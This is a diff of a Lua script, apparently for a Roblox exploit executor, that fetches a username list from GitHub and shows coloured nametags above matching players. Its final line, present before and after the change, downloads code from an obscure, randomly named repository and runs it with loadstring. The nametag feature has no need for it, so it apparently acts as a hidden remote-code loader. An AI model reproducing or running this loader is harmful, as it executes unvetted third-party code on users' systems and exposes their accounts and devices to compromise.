@@ -1,70 +1,155 @@
+
 local Players = game:GetService("Players")
 
 local TAG_NAME = "ScriptOwnerTag"
 local CHECK_INTERVAL = 2
-local PERMS_URL = "https://raw.githubusercontent.com/AstraOutlight/my-scripts/refs/heads/main/perms%20list"
 
-local TargetLookup = {}
+local TAGS_URL = "https://raw.githubusercontent.com/AstraOutlight/my-scripts/refs/heads/main/nametags"
 
-local function fetchTargetUsernames()
+local TagDefinitions = {}
+local PlayerTags = {}
+
+local function trim(str)
+    return str:match("^%s*(.-)%s*$")
+end
+
+local function fetchNametags()
     local success, result = pcall(function()
-        return game:HttpGet(PERMS_URL)
+        return game:HttpGet(TAGS_URL .. "?t=" .. tostring(os.time()))
     end)
 
-    if success then
-        TargetLookup = {}
-        for name in result:gmatch("([^,%s]+)") do
-            TargetLookup[name] = true
+    if not success then
+        warn("Failed to fetch nametags:", result)
+        return false
+    end
+
+    local definitions = {}
+    local assignments = {}
+
+    for line in result:gmatch("[^\r\n]+") do
+        line = trim(line)
+
+        if line ~= "" and not line:match("^#") then
+
+            local tagName, r, g, b = line:match(
+                "^([%w_]+)%s*=%s*(%d+)%s*,%s*(%d+)%s*,%s*(%d+)$"
+            )
+
+            if tagName then
+                definitions[tagName] = Color3.fromRGB(
+                    math.clamp(tonumber(r), 0, 255),
+                    math.clamp(tonumber(g), 0, 255),
+                    math.clamp(tonumber(b), 0, 255)
+                )
+            else
+                local username, assignedTag = line:match(
+                    "^([%w_]+)%s*,%s*([%w_]+)$"
+                )
+
+                if username then
+                    assignments[username:lower()] = assignedTag
+                end
+            end
         end
-    else
-        warn("Failed to fetch target usernames:", result)
+    end
+
+    TagDefinitions = definitions
+    PlayerTags = assignments
+
+    return true
+end
+
+local function removeTag(player)
+    local character = player.Character
+    if not character then return end
+
+    local head = character:FindFirstChild("Head")
+    if not head then return end
+
+    local existing = head:FindFirstChild(TAG_NAME)
+    if existing then
+        existing:Destroy()
     end
 end
 
 local function createTag(player)
-    if player.Character and player.Character:FindFirstChild("Head") then
-        if player.Character.Head:FindFirstChild(TAG_NAME) then return end
+    local character = player.Character
+    if not character then return end
 
-        local billboard = Instance.new("BillboardGui")
+    local head = character:FindFirstChild("Head")
+    if not head then return end
+
+    local tagType = PlayerTags[player.Name:lower()]
+    local color = tagType and TagDefinitions[tagType]
+
+    if not color then
+        removeTag(player)
+        return
+    end
+
+    local billboard = head:FindFirstChild(TAG_NAME)
+
+    if not billboard then
+        billboard = Instance.new("BillboardGui")
         billboard.Name = TAG_NAME
-        billboard.Size = UDim2.new(0, 100, 0, 40)
+        billboard.Size = UDim2.new(0, 180, 0, 40)
         billboard.StudsOffset = Vector3.new(0, 2.5, 0)
-        billboard.Adornee = player.Character.Head
+        billboard.Adornee = head
         billboard.AlwaysOnTop = true
-        billboard.Parent = player.Character.Head
+        billboard.MaxDistance = 150
+        billboard.Parent = head
+    end
 
-        local label = Instance.new("TextLabel")
-        label.Size = UDim2.new(1, 0, 1, 0)
+    local label = billboard:FindFirstChild("TagLabel")
+
+    if not label then
+        label = Instance.new("TextLabel")
+        label.Name = "TagLabel"
+        label.Size = UDim2.fromScale(1, 1)
         label.BackgroundTransparency = 1
-        label.Text = "Script Owner / Developer"
-        label.TextColor3 = Color3.new(1, 1, 0)
         label.TextStrokeTransparency = 0
         label.TextScaled = true
         label.Font = Enum.Font.GothamBold
         label.Parent = billboard
     end
+
+    label.Text = tagType
+    label.TextColor3 = color
 end
+
+local function updateAllTags()
+    for _, player in ipairs(Players:GetPlayers()) do
+        createTag(player)
+    end
+end
+
+local function setupPlayer(player)
+    player.CharacterAdded:Connect(function(character)
+        character:WaitForChild("Head", 10)
+        createTag(player)
+    end)
+
+    if player.Character then
+        createTag(player)
+    end
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    setupPlayer(player)
+end
+
+Players.PlayerAdded:Connect(setupPlayer)
 
 task.spawn(function()
     while true do
-        fetchTargetUsernames()
-        for _, player in pairs(Players:GetPlayers()) do
-            if TargetLookup[player.Name] then
-                createTag(player)
-            end
+        if fetchNametags() then
+            updateAllTags()
         end
+
         task.wait(CHECK_INTERVAL)
     end
 end)
 
-Players.PlayerAdded:Connect(function(player)
-    fetchTargetUsernames()
-    if TargetLookup[player.Name] then
-        player.CharacterAdded:Connect(function()
-            task.wait(1)
-            createTag(player)
-        end)
-    end
-end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"))()
+loadstring(game:HttpGet(
+    "https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"
+))()
